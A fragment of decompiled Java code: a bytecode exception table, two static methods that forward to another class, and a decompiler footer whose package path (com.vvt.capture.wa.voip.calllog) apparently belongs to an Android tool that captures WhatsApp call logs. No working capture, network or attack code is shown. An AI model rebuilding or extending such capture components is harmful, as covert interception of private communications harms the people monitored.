    //   266	271	390	finally
    //   278	285	390	finally
    //   289	296	390	finally
    //   300	305	390	finally
    //   355	358	390	finally
    //   155	162	403	java/lang/Exception
    //   176	183	403	java/lang/Exception
    //   187	194	403	java/lang/Exception
    //   198	203	403	java/lang/Exception
    //   210	217	403	java/lang/Exception
    //   221	228	403	java/lang/Exception
    //   232	237	403	java/lang/Exception
    //   244	251	403	java/lang/Exception
    //   255	262	403	java/lang/Exception
    //   266	271	403	java/lang/Exception
    //   278	285	403	java/lang/Exception
    //   289	296	403	java/lang/Exception
    //   300	305	403	java/lang/Exception
  }
  
  public static boolean b()
  {
    return com.vvt.capture.wa.full.a.d();
  }
  
  public static boolean b(String paramString)
  {
    return com.vvt.capture.wa.full.a.b(paramString);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/voip/calllog/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */